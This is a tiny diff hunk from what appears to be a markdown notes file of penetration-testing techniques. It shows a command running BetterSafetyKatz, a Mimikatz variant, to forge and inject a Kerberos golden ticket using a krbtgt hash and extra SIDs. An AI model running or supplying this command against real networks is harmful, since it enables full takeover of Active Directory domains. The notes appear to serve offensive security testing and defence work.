@@ -27,3 +27,4 @@ cssclasses:
 ```batch
 BetterSafetyKatz.exe "kerberos::golden /user:domain-controller-machine-account /id:1000 /sid:S-1-XXXXX /sids:S-1-XXXXX,S-1-XXX /krbtgt:<ntlm_hash> /ptt" "exit"
 ```
+
